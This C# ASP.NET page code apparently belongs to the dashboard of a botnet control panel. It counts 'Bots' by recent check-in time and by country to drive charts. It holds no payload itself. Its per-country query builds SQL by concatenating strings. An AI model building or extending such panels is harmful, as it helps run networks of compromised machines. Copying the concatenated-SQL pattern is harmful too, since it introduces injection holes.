using System;
using System.Data.SqlClient;
using System.Data;

public partial class Home : System.Web.UI.Page
{
    public string kleurSyntax;
    public string procentSyntax;
    public void Page_Load(object sender, EventArgs e)
    {
        if ((Session["Check"] == null) || (Convert.ToBoolean(Session["Check"]) == false))
        {
            Response.Redirect("Login.aspx");
        }

        using (SqlConnection conn = new SqlConnection("Data Source=localhost;Initial Catalog=Kennedy;Integrated Security=True"))
        {
            conn.Open();
            int onnlineNow;
            int connToday;
            int connWeek;
            int connMonth;
            int connTotal;

            double connTodayPre;
            double connWeekPre;
            double connMonthPre;
            double connNowPre;

            double procent = 0;
            int amountOfCountrys;

            using (SqlCommand cmd = new SqlCommand("SELECT count(*) FROM Bots;", conn))
            {
                connTotal = (int)cmd.ExecuteScalar();
                lblConnectionsTotal.Text = connTotal.ToString();
                lblTotalBots.Text = connTotal.ToString();
            }

            using (SqlCommand cmd = new SqlCommand("SELECT count(*) FROM Bots WHERE (LastConn <= convert(datetime,GETDATE())) AND (LastConn >= convert(datetime,DATEADD(second, -20 , GETDATE())));", conn))
            {
                onnlineNow = (int)cmd.ExecuteScalar();
                lblOnnlineNow.Text = onnlineNow.ToString();
                connNowPre = Math.Round((double)(100 * onnlineNow) / connTotal, 1);
                onlineNowPrec.Text = "data-percent=\"" + connNowPre + "\"";
            }

            using (SqlCommand cmd = new SqlCommand("SELECT count(*) FROM Bots WHERE (LastConn <= convert(datetime,GETDATE())) AND (LastConn >= convert(datetime,DATEADD(day, -1, GETDATE())));", conn))
            {
                connToday = (int)cmd.ExecuteScalar();
                lblConnectionsToday.Text = connToday.ToString();
                connTodayPre = Math.Round((double)(100 * connToday) / connTotal, 1);
                connTodayPrec.Text = "data-percent=\"" + connTodayPre + "\"";
            }

            using (SqlCommand cmd = new SqlCommand("SELECT count(*) FROM Bots WHERE (LastConn <= convert(datetime,GETDATE())) AND (LastConn >= convert(datetime,DATEADD(day, -7, GETDATE())));", conn))
            {
                connWeek = (int)cmd.ExecuteScalar();
                lblConnectionsWeek.Text = connWeek.ToString();
                connWeekPre = Math.Round((double)(100 * connWeek) / connTotal , 1);
                connWeekPrec.Text = "data-percent=\"" + connWeekPre + "\"";
            }

            using (SqlCommand cmd = new SqlCommand("SELECT count(*) FROM Bots WHERE (LastConn <= convert(datetime,GETDATE())) AND (LastConn >= convert(datetime,DATEADD(day, -30, GETDATE())));", conn))
            {
                connMonth = (int)cmd.ExecuteScalar();
                lblConnectionsMonth.Text = connMonth.ToString();
                connMonthPre = Math.Round((double)(100 * connMonth) / connTotal , 1);
                connMonthPrec.Text = "data-percent=\"" + connMonthPre + "\"";

            }

            using (SqlCommand cmd = new SqlCommand("select count(distinct Country) from bots", conn))
            {
                amountOfCountrys = (int)cmd.ExecuteScalar() + 1;
            }

            string[] land = new string[amountOfCountrys];
            int[] landAantal = new int[amountOfCountrys];

            for (int i = 1; i < amountOfCountrys; i++)
            { 
                using (SqlCommand cmd = new SqlCommand("select Country from(select distinct Country, DENSE_RANK() over (order by country) as rownum from bots) as tbl where tbl.rownum = " + i +"", conn))
                {
                    land[i] = (string)cmd.ExecuteScalar();
                }

                using (SqlCommand cmd = new SqlCommand("select count(*) from bots where Country = '" + land[i] + "'", conn))
                {
                    landAantal[i] = (int)cmd.ExecuteScalar();
                }

                procent = Math.Round((double)(100 * landAantal[i]) / connTotal , 1);

                kleurSyntax += "\"" + land[i] + "\" " + ":" + landAantal[i] + ", ";
                procentSyntax += "\"" + land[i] + "\" " + ":" + procent + ", ";
            }
        }
    }
}
